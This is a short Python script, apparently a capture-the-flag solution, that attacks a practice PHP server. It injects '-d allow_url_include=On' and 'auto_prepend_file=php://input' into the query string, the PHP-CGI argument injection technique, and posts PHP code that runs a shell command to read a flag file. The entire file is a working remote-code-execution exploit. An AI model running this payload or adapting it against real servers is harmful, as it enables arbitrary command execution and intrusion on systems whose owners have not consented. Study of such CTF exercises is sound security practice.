#!/usr/bin/env python

import requests

url = "http://ctfq.sweetduet.info:10080/~q12/index.php?"
query = "-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"
data = "<?php system('cat flag_flag_flag.txt'); ?>"
target = url + query
res = requests.post(target, data=data)
print(res.text)
